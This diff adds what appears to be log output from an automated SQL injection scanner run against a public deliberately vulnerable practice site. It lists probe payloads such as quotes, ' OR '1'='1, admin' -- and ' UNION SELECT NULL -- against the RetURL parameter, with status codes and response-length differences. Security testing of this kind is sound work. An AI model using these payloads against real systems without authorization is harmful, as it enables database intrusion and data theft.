@@ -1,0 +1,112 @@
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : '
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27
+============================================================
+
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : ''
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27%27
+============================================================
+
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : "
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%22
+============================================================
+
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : ' OR '1'='1
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27+OR+%271%27%3D%271
+============================================================
+
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : " OR "1"="1
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%22+OR+%221%22%3D%221
+============================================================
+
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : admin' --
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.htmladmin%27+--
+============================================================
+
+============================================================
+Possible SQL Injection Found
+Parameter : RetURL
+Payload   : ' UNION SELECT NULL --
+URL       : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27+UNION+SELECT+NULL+--
+============================================================
+
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : admin' --
+Status Code : 200
+Length Diff : 30
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.htmladmin%27+--
+
+======================================================================
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : '
+Status Code : 200
+Length Diff : 6
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27
+
+======================================================================
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : ' UNION SELECT NULL --
+Status Code : 200
+Length Diff : 56
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27+UNION+SELECT+NULL+--
+
+======================================================================
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : ' OR '1'='1
+Status Code : 200
+Length Diff : 42
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27+OR+%271%27%3D%271
+
+======================================================================
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : "
+Status Code : 200
+Length Diff : 6
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%22
+
+======================================================================
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : " OR "1"="1
+Status Code : 200
+Length Diff : 42
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%22+OR+%221%22%3D%221
+
+======================================================================
+
+Possible SQL Injection Found
+Parameter   : RetURL
+Payload     : ''
+Status Code : 200
+Length Diff : 12
+URL         : http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize.asp%3Fitem%3Dhtml%2Fabout.html%27%27
+
+======================================================================
